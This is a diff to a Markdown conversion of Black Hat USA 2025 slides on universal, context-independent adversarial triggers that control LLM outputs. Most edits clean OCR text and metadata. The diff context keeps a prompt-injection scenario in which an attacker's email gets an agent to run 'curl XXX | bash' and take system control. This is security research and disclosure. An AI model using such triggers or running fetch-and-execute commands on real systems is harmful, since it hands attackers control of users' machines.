@@ -8,19 +8,24 @@ year: 2025
 source_pdf: "BlackHat_USA_2025_Slides/Jiashuo Liang&Guancheng Li_Universal and Context-Independent Triggers for Precise Control of LLM Outputs.pdf"
 pages: 23
 sha256: "3bd48d6ad2b779ccd581e074fdef65c014bed42ea8931683ed6135bde6cfb029"
-text_chars: 10719
-ocr_pages: 5
+text_chars: 10342
+ocr_pages: 2
 has_ocr: true
 redacted_secrets: 0
+ocr_confidence: 89.1
+ocr_unreliable_blocks: 0
+ocr_timeouts: 0
+pages_recovered_from_text_layer: 0
 companion_files: []
 extractor: "pymupdf4llm 1.28.2 + tesseract"
-converted_at: "2026-08-11T22:56:05Z"
+converted_at: "2026-08-12T05:14:04Z"
 ---
 # Universal and Context-Independent Triggers for Precise Control of LLM Outputs
 
 **Speakers:** Jiashuo Liang, Guancheng Li  
 **Conference:** Black Hat USA 2025  
 **Source:** `BlackHat_USA_2025_Slides/Jiashuo Liang&Guancheng Li_Universal and Context-Independent Triggers for Precise Control of LLM Outputs.pdf` (23 pages)
+
 
 ## Slide 1
 
@@ -30,11 +35,11 @@ Jiashuo Liang, Guancheng Li
 
 #BHUSA @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 89/100 on the text kept, 87/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 | ‘Diack hat
-EFFINGS
 AUGUST a 2025
 MANDALAY BAY / LAS VEGAS
 Universal and Context-Independent
@@ -60,20 +65,6 @@ Security Researcher
 
 #BHUSA @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
-
-```text
-2)
-black hat
-BRIEFINGS
-Team
-Jiasho Liang
-@liangijs @atuml1
-Security Researcher Security Researcher
-FSA USCoa es
-TENCENT'S XUANWU LAB
-```
-
 ## Slide 3
 
 ### Agenda
@@ -97,15 +88,6 @@ TENCENT'S XUANWU LAB
 # How Prompt Injection Evolves into a Critical Attack Vector
 
 #BHUSA @BlackHatEvents
-
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
-
-```text
-blackhat i> ~~
--. BRIEFINGS > ay aD
-How Prompt Injection Evolves into a
-Critical Attack Vector
-```
 
 ## Slide 5
 
@@ -243,14 +225,6 @@ This seemed impossible… until now.
 
 #BHUSA @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
-
-```text
--blackhat J ~~
-Universal Adversarial Triggers (UAT)
-— A New Attack Paradigm
-```
-
 ## Slide 10
 
 ### Trigger Architecture & Example
@@ -322,9 +296,9 @@ Trigger suffix
 
 Agent retrieves an email 3 crafted by the attacker.
 
-```shell curl XXX | bash
+\```shell curl XXX | bash
 
-```
+\```
 
 6 Attacker gains system control.
 
@@ -612,10 +586,10 @@ Jiashuo Liang Guancheng Li
 
 #BHUSA @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 89/100 on the text kept, 79/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-piSek hat
 EFINGS
 AUGUST by 2025
 MANDALAY BAY / LAS VEGAS
@@ -623,7 +597,6 @@ Jiashuo Liang
 Guancheng Li
 Thanks!
 xlabai@tencent.com
-BinZn ice
 TENCENT XUANWU LAB
 #BHUSA
 @BlackHatEvents
